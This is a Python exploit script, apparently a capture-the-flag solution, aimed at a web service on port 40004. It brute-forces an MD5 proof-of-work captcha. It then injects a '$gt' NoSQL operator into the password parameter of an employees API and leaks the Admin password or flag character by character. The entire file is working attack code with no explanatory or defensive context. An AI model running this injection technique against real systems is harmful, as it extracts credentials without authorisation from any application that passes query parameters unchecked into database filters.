from hashlib import md5
from requests import Session
import sys
import string


def brute_md5(prefix):
    for i in range(0, 100000000):
        hash_str = md5((prefix + str(i)).encode()).hexdigest()
        if hash_str[:4] == '0000':
            return str(i)
    raise ValueError("Failed to find!")


def main():
    IP = 'localhost'

    if len(sys.argv) > 1:
        IP = sys.argv[1]

    sess = Session()
    resp = sess.get(f'http://{IP}:40004/api/captcha').json()
    answer = brute_md5(resp['prefix'])

    resp = sess.post(f'http://{IP}:40004/api/captcha', json={'answer': answer})
    print(resp.json())

    prefix = 'Sabantuy{'
    resp = sess.get(f'http://{IP}:40004/api/employees', params={'username': 'Admin', 'password[$gt]': prefix})
    print(resp.json())

    finish = False

    while not finish:
        for p in range(1, 256):
            resp = sess.get(f'http://{IP}:40004/api/employees',
                            params={'username': 'Admin', 'password[$gt]': prefix + chr(p)})
            if len(resp.json()) == 0:
                prefix += chr(p - 1)
                print(prefix)
                break
        else:
            finish = True


if __name__ == '__main__':
    main()
